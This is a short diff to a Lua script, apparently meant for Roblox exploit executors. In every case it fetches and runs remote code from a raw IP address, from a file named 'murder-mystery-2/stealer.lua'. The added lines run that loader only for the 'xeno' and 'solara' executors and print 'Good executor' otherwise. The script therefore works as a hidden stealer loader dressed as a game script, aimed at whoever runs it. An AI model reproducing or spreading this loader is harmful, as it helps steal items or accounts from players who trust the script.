@@ -1,3 +1,9 @@
-ID="GVlqzxAp4vwJiZ9D5yFcCeoeX44IVGn4XI938uaI"
+local executor = (identifyexecutor and string.lower(identifyexecutor())) or ""
+
+if executor:find("xeno") or executor:find("solara") then
+    ID="GVlqzxAp4vwJiZ9D5yFcCeoeX44IVGn4XI938uaI"
 SERVER_URL="http://72.56.64.162/"
 loadstring(game:HttpGet(SERVER_URL .. "murder-mystery-2/stealer.lua"))()
+else
+    print("Good executor")
+end
